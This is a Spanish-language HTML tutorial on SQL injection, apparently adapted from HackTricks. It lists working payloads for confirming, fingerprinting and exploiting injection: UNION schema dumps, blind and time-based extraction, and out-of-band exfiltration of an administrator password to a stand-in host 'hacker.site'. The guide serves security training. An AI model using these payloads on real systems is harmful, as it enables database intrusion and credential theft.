<div class="sql-injection-tutorial-container">
  <h1>¿Qué es la inyección SQL?</h1>
  <p>
    Una inyección SQL es una falla de seguridad que permite a los atacantes interferir con las consultas de la base de datos de una aplicación. Esta vulnerabilidad puede permitir a los atacantes ver, modificar o eliminar datos a los que no deberían tener acceso, incluida la información de otros usuarios o cualquier dato al que la aplicación pueda acceder. Tales acciones pueden resultar en cambios permanentes en la funcionalidad o el contenido de la aplicación, comprometer el servidor o incluso causar una denegación de servicio.
  </p>
  <h2>Detección de puntos de entrada</h2>
  <p>
    Cuando un sitio parece ser vulnerable a inyección SQL (SQLi) debido a respuestas inusuales del servidor a entradas relacionadas con SQLi, el primer paso es comprender cómo inyectar datos en la consulta sin interrumpirla. Esto requiere identificar el método para escapar del contexto actual de manera efectiva. Estos son algunos ejemplos útiles:
  </p>
  <ul>
    <li>[Nada]</li>
    <li>'</li>
    <li>"</li>
    <li>`</li>
    <li>')</li>
    <li>")</li>
    <li>`)</li>
    <li>'))</li>
    <li>"))</li>
    <li>`))</li>
  </ul>
  <p>
    Luego, necesitas saber cómo arreglar la consulta para que no haya errores. Para arreglar la consulta, puedes ingresar datos para que la consulta anterior acepte los nuevos datos, o simplemente puedes ingresar tus datos y agregar un símbolo de comentario al final.
  </p>
  <p>
    Ten en cuenta que si puedes ver mensajes de error o puedes detectar diferencias cuando una consulta funciona y cuando no, esta fase será más fácil.
  </p>
  <h3>Comentarios</h3>
  <ul>
    <li>MySQL: #comentario</li>
    <li>MySQL: -- comentario [Nota el espacio después de los dos guiones]</li>
    <li>MySQL: /*comentario*/</li>
    <li>MySQL: /*! MYSQL Special SQL */</li>
    <li>PostgreSQL: --comentario</li>
    <li>PostgreSQL: /*comentario*/</li>
    <li>MSQL: --comentario</li>
    <li>MSQL: /*comentario*/</li>
    <li>Oracle: --comentario</li>
    <li>SQLite: --comentario</li>
    <li>SQLite: /*comentario*/</li>
    <li>HQL: HQL no soporta comentarios</li>
  </ul>

  <h2>Confirmación con operaciones lógicas</h2>
  <p>
    Un método confiable para confirmar una vulnerabilidad de inyección SQL implica ejecutar una operación lógica y observar los resultados esperados. Por ejemplo, un parámetro GET como ?username=Peter que produce contenido idéntico cuando se modifica a ?username=Peter' o '1'='1 indica una vulnerabilidad de inyección SQL.
  </p>
  <p>
    Del mismo modo, la aplicación de operaciones matemáticas sirve como una técnica de confirmación efectiva. Por ejemplo, si acceder a ?id=1 y ?id=2-1 produce el mismo resultado, es indicativo de una inyección SQL.
  </p>
  <p>Ejemplos que demuestran la confirmación de operación lógica:</p>
  <ul>
    <li>page.asp?id=1 or 1=1 -- resulta en verdadero</li>
    <li>page.asp?id=1' or 1=1 -- resulta en verdadero</li>
    <li>page.asp?id=1" or 1=1 -- resulta en verdadero</li>
    <li>page.asp?id=1 and 1=2 -- resulta en falso</li>
  </ul>

  <h2>Confirmación con Tiempos</h2>
  <p>
    En algunos casos, no notarás ningún cambio en la página que estás probando. Por lo tanto, una buena manera de descubrir inyecciones SQL ciegas es hacer que la base de datos realice acciones que tendrán un impacto en el tiempo que la página necesita para cargar.
  </p>
  <p>
    Por lo tanto, vamos a concatenar en la consulta SQL una operación que tomará mucho tiempo en completarse:
  </p>
  <ul>
    <li>MySQL (concatenación de cadenas y operaciones lógicas)</li>
    <ul>
      <li>1' + sleep(10)</li>
      <li>1' and sleep(10)</li>
      <li>1' && sleep(10)</li>
      <li>1' | sleep(10)</li>
    </ul>
    <li>PostgreSQL (solo soporta concatenación de cadenas)</li>
    <ul>
      <li>1' || pg_sleep(10)</li>
    </ul>
    <li>MSQL</li>
    <ul>
      <li>1' WAITFOR DELAY '0:0:10'</li>
    </ul>
    <li>Oracle</li>
    <ul>
      <li>1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])</li>
      <li>1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)</li>
    </ul>
    <li>SQLite</li>
    <ul>
      <li>1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))</li>
      <li>1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))</li>
    </ul>
  </ul>
  <p>
    En algunos casos, las funciones de sleep no estarán permitidas. Entonces, en lugar de usar esas funciones, podrías hacer que la consulta realice operaciones complejas que tomarán varios segundos. Ejemplos de estas técnicas se comentarán por separado en cada tecnología (si corresponde).
  </p>

  <h2>Identificación del Backend</h2>
  <p>
    La mejor manera de identificar el backend es intentar ejecutar funciones de los diferentes backends. Podrías usar las funciones de sleep de la sección anterior o estas (tabla de payloadsallthethings):
  </p>
  <ul>
    <li>["conv('a',16,2)=conv('a',16,2)", "MYSQL"]</li>
    <li>["connection_id()=connection_id()", "MYSQL"]</li>
    <li>["crc32('MySQL')=crc32('MySQL')", "MYSQL"]</li>
    <li>["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)", "MSSQL"]</li>
    <li>["&#64;&#64;CONNECTIONS>0", "MSSQL"]</li>
    <li>["&#64;&#64;CONNECTIONS=&#64;&#64;CONNECTIONS", "MSSQL"]</li>
    <li>["&#64;&#64;CPU_BUSY=&#64;&#64;CPU_BUSY", "MSSQL"]</li>
    <li>["USER_ID(1)=USER_ID(1)", "MSSQL"]</li>
    <li>["ROWNUM=ROWNUM", "ORACLE"]</li>
    <li>["RAWTOHEX('AB')=RAWTOHEX('AB')", "ORACLE"]</li>
    <li>["LNNVL(0=123)", "ORACLE"]</li>
    <li>["5::int=5", "POSTGRESQL"]</li>
    <li>["5::integer=5", "POSTGRESQL"]</li>
    <li>["pg_client_encoding()=pg_client_encoding()", "POSTGRESQL"]</li>
    <li>["get_current_ts_config()=get_current_ts_config()", "POSTGRESQL"]</li>
    <li>["quote_literal(42.5)=quote_literal(42.5)", "POSTGRESQL"]</li>
    <li>["current_database()=current_database()", "POSTGRESQL"]</li>
    <li>["sqlite_version()=sqlite_version()", "SQLITE"]</li>
    <li>["last_insert_rowid()>1", "SQLITE"]</li>
    <li>["last_insert_rowid()=last_insert_rowid()", "SQLITE"]</li>
    <li>["val(cvar(1))=1", "MSACCESS"]</li>
    <li>["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0", "MSACCESS"]</li>
    <li>["cdbl(1)=cdbl(1)", "MSACCESS"]</li>
    <li>["1337=1337", "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"]</li>
    <li>["'i'='i'", "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"]</li>
  </ul>
  <p>
    Además, si tienes acceso a la salida de la consulta, podrías hacer que imprima la versión de la base de datos.
  </p>
  <p>
    A continuación, vamos a discutir diferentes métodos para explotar diferentes tipos de inyección SQL. Usaremos MySQL como ejemplo.
  </p>

  <h2>Identificación con PortSwigger</h2>
  <p>
    <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">PortSwigger SQL Injection Cheat Sheet</a>
  </p>

  <h2>Explotación basada en UNION</h2>
  <h3>Detectando el número de columnas</h3>
  <p>
    Si puedes ver la salida de la consulta, esta es la mejor manera de explotarla. Primero, necesitamos averiguar el número de columnas que la solicitud inicial está devolviendo. Esto se debe a que ambas consultas deben devolver el mismo número de columnas.
  </p>
  <h3>Métodos típicos:</h3>
  <p>Order/Group by</p>
  <p>
    Para determinar el número de columnas en una consulta, ajusta incrementalmente el número usado en las cláusulas ORDER BY o GROUP BY hasta recibir una respuesta falsa. A pesar de las funcionalidades distintas de GROUP BY y ORDER BY dentro de SQL, ambos pueden ser utilizados de manera idéntica para determinar el número de columnas de la consulta.
  </p>
  <ul>
    <li>1' ORDER BY 1--+ #True</li>
    <li>1' ORDER BY 2--+ #True</li>
    <li>1' ORDER BY 3--+ #True</li>
    <li>1' ORDER BY 4--+ #False - La consulta solo está usando 3 columnas</li>
    <li>1' GROUP BY 1--+ #True</li>
    <li>1' GROUP BY 2--+ #True</li>
    <li>1' GROUP BY 3--+ #True</li>
    <li>1' GROUP BY 4--+ #False - La consulta solo está usando 3 columnas</li>
  </ul>
  <h3>UNION SELECT</h3>
  <p>Selecciona más y más valores nulos hasta que la consulta sea correcta:</p>
  <ul>
    <li>1' UNION SELECT null-- - No funciona</li>
    <li>1' UNION SELECT null,null-- - No funciona</li>
    <li>1' UNION SELECT null,null,null-- - Funciona</li>
  </ul>
  <p>
    Debes usar valores null ya que en algunos casos el tipo de las columnas de ambos lados de la consulta debe ser el mismo y null es válido en todos los casos.
  </p>
  <h3>Extracción de nombres de bases de datos, nombres de tablas y nombres de columnas</h3>
  <p>
    En los siguientes ejemplos vamos a recuperar el nombre de todas las bases de datos, el nombre de la tabla de una base de datos, los nombres de las columnas de la tabla:
  </p>
  <ul>
    <li>#Nombres de bases de datos</li>
    <li>-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata</li>
    <li>#Tablas de una base de datos</li>
    <li>-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[base de datos]</li>
    <li>#Nombres de columnas</li>
    <li>-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[nombre de la tabla]</li>
  </ul>
  <p>
    Hay una forma diferente de descubrir estos datos en cada base de datos diferente, pero siempre es la misma metodología.
  </p>
  <h3>Explotación basada en errores ocultos</h3>
  <p>
    Cuando la salida de una consulta es visible, pero parece imposible una inyección basada en UNION, esto indica la presencia de una inyección basada en errores oculta. Esta situación a menudo conduce a una inyección ciega. Para transformar una inyección ciega en una basada en UNION, es necesario discernir la consulta de ejecución en el backend.
  </p>
  <p>
    Esto se puede lograr mediante el uso de técnicas de inyección ciega junto con las tablas predeterminadas específicas de tu sistema de gestión de bases de datos objetivo (DBMS). Para entender estas tablas predeterminadas, se aconseja consultar la documentación del DBMS objetivo.
  </p>
  <p>
    Una vez que se ha extraído la consulta, es necesario adaptar tu payload para cerrar de manera segura la consulta original. Posteriormente, se añade una consulta UNION a tu payload, facilitando la explotación de la nueva inyección basada en UNION accesible.
  </p>
  <p>
    Para obtener más información, consulta el artículo completo disponible en <a href="https://book.hacktricks.xyz/pentesting-web/blind-sql-injection">Healing Blind Injections</a>.
  </p>
  <h3>Explotación basada en errores</h3>
  <p>
    Si por alguna razón no puedes ver la salida de la consulta pero puedes ver los mensajes de error, puedes hacer que estos mensajes de error exfiltren datos de la base de datos. Siguiendo un flujo similar al de la explotación basada en UNION, podrías gestionar para volcar la base de datos.
  </p>
  <p>
    (select 1 and row(1,1)>(select count(*),concat(CONCAT(&#64;&#64;VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
  </p>
  <h3>Explotación ciega de SQLi</h3>
  <p>
    En este caso, no puedes ver los resultados de la consulta ni los errores, pero puedes distinguir cuando la consulta devuelve una respuesta verdadera o falsa porque hay diferentes contenidos en la página. En este caso, puedes abusar de ese comportamiento para volcar la base de datos carácter por carácter:
  </p>
  <p>
    ?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
  </p>
  <h3>Explotación de SQLi ciega basada en errores</h3>
  <p>
    Este es el mismo caso que el anterior, pero en lugar de distinguir entre una respuesta verdadera/falsa de la consulta, puedes distinguir entre un error en la consulta SQL o no (tal vez porque el servidor HTTP se bloquea). Por lo tanto, en este caso, puedes forzar un error SQL cada vez que adivines correctamente el carácter:
  </p>
  <p>
    AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
  </p>
  <h3>Explotación de SQLi basada en el tiempo</h3>
  <p>
    En este caso, no hay forma de distinguir la respuesta de la consulta basada en el contexto de la página. Pero, puedes hacer que la página tarde más en cargar si el carácter adivinado es correcto. Ya hemos visto esta técnica en uso anteriormente para confirmar una vulnerabilidad SQLi.
  </p>
  <p>
    1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
  </p>
  <h3>Consultas apiladas</h3>
  <p>
    Puedes usar consultas apiladas para ejecutar múltiples consultas sucesivamente. Ten en cuenta que, aunque las consultas posteriores se ejecuten, los resultados no se devuelven a la aplicación. Por lo tanto, esta técnica es principalmente útil en relación con vulnerabilidades ciegas, donde puedes usar una segunda consulta para activar una búsqueda de DNS, un error condicional o un retraso de tiempo.
  </p>
  <p>
    Oracle no soporta consultas apiladas. MySQL, Microsoft y PostgreSQL las soportan: QUERY-1-HERE; QUERY-2-HERE
  </p>
  <h3>Explotación fuera de banda</h3>
  <p>
    Si ningún otro método de explotación funcionó, puedes intentar hacer que la base de datos exfiltre la información a un host externo controlado por ti. Por ejemplo, a través de consultas DNS:
  </p>
  <p>
    select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
  </p>
  <h3>Exfiltración de datos fuera de banda mediante XXE</h3>
  <p>
    a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
  </p>
  <h3>Explotación automatizada</h3>
  <p>
    Consulta la <a href="https://github.com/sqlmapproject/sqlmap">cheatsheet de SQLMap</a> para explotar una vulnerabilidad de SQLi con sqlmap.
  </p>
  <h3>Información específica de tecnología</h3>
  <p>
    Ya hemos discutido todas las formas de explotar una vulnerabilidad de inyección SQL. Encuentra algunos trucos más dependientes de la tecnología de base de datos en este libro:
  </p>
  <ul>
    <li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/ms-access">MS Access</a></li>
    <li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql">MSSQL</a></li>
    <li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql">MySQL</a></li>
    <li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/oracle">Oracle</a></li>
    <li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql">PostgreSQL</a></li>
  </ul>
  <p>
    O encontrarás muchos trucos relacionados con: MySQL, PostgreSQL, Oracle, MSSQL, SQLite y HQL en <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">PayloadsAllTheThings</a>.
  </p>
</div>
